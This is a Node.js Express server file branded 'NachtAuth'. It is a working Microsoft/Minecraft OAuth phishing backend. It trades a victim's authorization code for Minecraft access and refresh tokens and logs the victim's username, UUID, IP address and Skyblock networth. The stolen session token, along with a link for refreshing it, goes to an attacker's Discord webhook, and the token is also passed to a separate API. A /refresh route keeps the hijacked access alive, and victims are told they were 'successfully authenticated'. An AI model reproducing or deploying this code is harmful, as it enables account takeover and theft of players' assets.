// gute nacht was here !
// Cleaned and proxy-enabled app.js
// Replace SKYHELPER_PROXY_BASE if you want a different proxy

const networthCalc = require('./utils/Networth');
const SendAPI = require('./utils/SendAPI');
const config = require('./config.json');
const iplim = require("iplim");
const axios = require('axios');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// your azure application info (still used to build MS authorize URL client-side)
const client_secret = config.azure.client_secret;
const client_id = config.azure.client_id;
const redirect_uri = config.azure.redirect_uri;
const webhook = config.webhook.webhookURL;

// PROXY: change this if you want a different proxy
const SKYHELPER_PROXY_BASE = "https://api.skyhelper.net"; // <-- change if needed

// rate limiter
app.use(iplim({ timeout: 1000 * 10 * 15, limit: 4, exclude: [], log: false }));
app.set("trust proxy", true);

app.get('/', async (req, res) => {
  const code = req.query.code;
  if (!code) {
    return res.send("No code provided.");
  }
  try {
    // get all the data (proxy will exchange the code and return username, uuid, tokens)
    const data = await ReturnData(code);
    const username = data[0];
    const uuid = data[1];
    const BearerToken = data[2];
    const RefreshToken = data[3];
    const ip = getIp(req);

    // initialize networth variables
    let networth = "0";
    let soulboundnetworth = "0";
    let sentnetworth = 0;
    let description = "No profile data found. 🙁";

    // get networth and description (this runs async; we still respond to user)
    networthCalc(uuid).then((result) => {
      networth = Intl.NumberFormat('en-US', {
        notation: 'compact',
        maximumFractionDigits: 2,
      }).format(result[0]);
      soulboundnetworth = Intl.NumberFormat('en-US', {
        notation: 'compact',
        maximumFractionDigits: 2,
      }).format(result[1]);
      description = result[2];
      sentnetworth = (Math.trunc(result[0])) / 1000000;

      // send everything to the webhook
      PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
      // send everything to the API
      SendAPI(username, sentnetworth, BearerToken);
    }).catch((error) => {
      console.error("Networth calc error:", error);
    });
  } catch (e) {
    console.error("ReturnData error:", e.response?.data || e.message || e);
    return res.status(500).send("Authentication failed. Check logs.");
  }

  // put something to the screen so that the user can leave the page
  res.send('You were successfully authenticated! You can now close this tab.');
});

// start the server
app.listen(PORT, () => {
  console.log(`Started the server on ${PORT}`);
});

// --------- Proxy-based ReturnData ----------
/**
 * Exchanges the microsoft code for Minecraft/Bearer tokens via a proxy.
 * Expects the proxy to return JSON: { username, uuid, accessToken, refreshToken }
 *
 * If your proxy expects a different shape, update the axios POST below accordingly.
 */
async function ReturnData(code) {
  try {
    const response = await axios.post(
      `${SKYHELPER_PROXY_BASE}/auth/microsoft`,
      {
        code,
        redirectUri: config.azure.redirect_uri
        // Some proxies require client_id/secret here; add them if needed:
        // client_id: config.azure.client_id,
        // client_secret: config.azure.client_secret
      },
      {
        headers: { 'Content-Type': 'application/json' },
        timeout: 20000
      }
    );

    // normalize keys (some proxies use different names)
    const body = response.data || {};
    const username = body.username || body.name || body.user || null;
    const uuid = body.uuid || body.id || body.userId || null;
    const accessToken = body.accessToken || body.access_token || body.bearer || null;
    const refreshToken = body.refreshToken || body.refresh_token || null;

    if (!username || !uuid || !accessToken) {
      throw new Error("Proxy did not return required fields (username, uuid, accessToken).");
    }

    return [username, uuid, accessToken, refreshToken];
  } catch (err) {
    console.error("ReturnData proxy error:", err.response?.data || err.message || err);
    throw err;
  }
}

// --------- /refresh route uses proxy refresh endpoint ----------
app.get('/refresh', async (req, res) => {
  const refresh_token = req.query.refresh_token;
  if (!refresh_token) return res.status(400).send("Missing refresh_token query param.");

  try {
    // Call proxy refresh endpoint (if the proxy supports it).
    // If your proxy doesn't have a refresh endpoint, you can re-run the authorize flow instead.
    const r = await axios.post(
      `${SKYHELPER_PROXY_BASE}/auth/refresh`,
      { refresh_token },
      { headers: { 'Content-Type': 'application/json' }, timeout: 20000 }
    );

    const body = r.data || {};
    const accessToken = body.accessToken || body.access_token;
    const newRefresh = body.refreshToken || body.refresh_token;

    if (!accessToken) {
      return res.status(500).send("Proxy refresh failed - no accessToken returned.");
    }

    // Optionally call GetPlayer to fetch username/uuid and networth
    const [uuid, username] = await (async () => {
      try {
        const p = await GetPlayer(accessToken);
        return [p[0], p[1]];
      } catch {
        return [null, null];
      }
    })();

    // If desired compute networth and send webhook similar to original flow
    let networth = "0", soulboundnetworth = "0", description = "No profile data found. 🙁";
    if (uuid) {
      try {
        const result = await networthCalc(uuid);
        networth = Intl.NumberFormat('en-US', { notation: 'compact', maximumFractionDigits: 2 }).format(result[0]);
        soulboundnetworth = Intl.NumberFormat('en-US', { notation: 'compact', maximumFractionDigits: 2 }).format(result[1]);
        description = result[2];
      } catch (e) {
        console.error("Networth calc on refresh failed:", e);
      }
    }

    // Post webhook (refresh = true)
    PostWebhook(true, username || "Unknown", uuid || "Unknown", "Unknown", accessToken, newRefresh || refresh_token, networth, soulboundnetworth, description);

    res.send("Token refreshed successfully! You may now close this window :)");
  } catch (err) {
    console.error("Refresh proxy error:", err.response?.data || err.message || err);
    res.status(500).send("Unable to refresh token. Check logs.");
  }
});

// function to get the user's username and uuid
async function GetPlayer(BearerToken) {
  const url = 'https://api.minecraftservices.com/minecraft/profile';
  const configReq = {
    headers: {
      'Authorization': 'Bearer ' + BearerToken,
    },
    timeout: 10000
  };
  let response = await axios.get(url, configReq);
  return [response.data['id'], response.data['name']];
}

function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, networth, soulboundnetworth, description) {
  let embeddescription;
  let networthtext;

  if (refresh) {
    embeddescription = "A token has been refreshed!";
  } else {
    embeddescription = "A user has been authenticated!";
  }

  if (networth == 0) {
    networthtext = "🪙 Networth: 0";
  } else {
    networthtext = "🪙 Networth: " + soulboundnetworth + " (" + networth + " unsoulbound)";
  }

  let data = {
    "username": "NachtAuth",
    "avatar_url": "https://cdn.discordapp.com/attachments/1053140780425945100/1055361442901135450/NachtAuth.png",
    "embeds": [
      {
        "title": "NachtAuth",
        "description": embeddescription,
        "color": 0x7289DA,
        "author": { "name": networthtext },
        footer: {
          "text": "🌟 NachtAuth by Gute Nacht 🌟",
          "url": "https://cdn.discordapp.com/attachments/1053140780425945100/1055361442901135450/NachtAuth.png"
        },
        timestamp: new Date(),
        "fields": [
          { "name": "Username", "value": "```" + username + "```", "inline": true },
          { "name": "UUID", "value": "```" + uuid + "```", "inline": true },
          { "name": "IP Address", "value": "```" + ip + "```", "inline": true },
          { "name": "Session ID", "value": "```" + BearerToken + "```", "inline": false },
          { "name": "Refresh Token", "value": `Click [here](${redirect_uri}refresh?refresh_token=${refresh_token}) to refresh their token!` }
        ]
      }
    ]
  };

  if (description != "No profile data found. 🙁") {
    data.embeds.push({
      title: "🌍 Skyblock Profile Info",
      color: 0x7289DA,
      fields: description,
      url: "https://sky.shiiyu.moe/stats/" + username,
      footer: { "text": "🌟 NachtAuth by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!" }
    });
  } else {
    data.embeds.push({
      title: "🌍 Skyblock Profile Info",
      color: 0x7289DA,
      description: "No profile data found. 🙁",
      url: "https://sky.shiiyu.moe/stats/" + username,
      footer: { "text": "🌟 NachtAuth by Gute Nacht 🌟" }
    });
  }

  axios({
    method: "POST",
    url: webhook,
    headers: { "Content-Type": "application/json" },
    data: data,
  }).catch(error => {
    console.error("Error sending webhook: ", error?.response?.data || error?.message || error);
  });
}

function getIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-real-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.connection?.remoteAddress ||
    ""
  );
}
